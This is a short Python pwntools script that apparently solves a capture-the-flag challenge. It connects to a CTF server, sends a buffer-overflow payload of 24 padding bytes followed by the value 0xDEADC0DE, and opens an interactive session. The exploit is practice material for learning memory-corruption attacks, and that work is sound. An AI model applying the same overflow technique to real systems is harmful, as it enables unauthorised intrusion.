from pwn import *

r = remote('pwn-2021.duc.tf', 31916)
print(r.recv())

payload = b'a'*24 + p64(0x0DEADC0DE)
r.sendline(payload)

r.interactive()

